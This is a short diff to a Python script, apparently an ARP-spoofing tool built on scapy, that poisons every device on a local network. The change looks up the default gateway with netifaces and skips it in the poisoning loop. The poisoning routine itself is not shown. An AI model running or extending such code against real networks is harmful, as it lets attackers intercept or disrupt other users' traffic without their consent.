@@ -5,6 +5,7 @@
 
 from multiprocessing import Process
 from scapy.all import *
+import netifaces
 
 # custom libraries
 from networkScanner import Scanner
@@ -29,8 +30,12 @@ def main():
 
     logger.say(f'poisoning the entire network')
 
+    # identify the gateway
+    gws = netifaces.gateways()
+    gateway = gws['default'][netifaces.AF_INET][0]
+
     for device in deviceList:
-        if device != IP:
+        if device != IP and device != gateway:
             logger.say(f'poisoning {device}')
             arp.ARP_poison(device, IP, True)
 
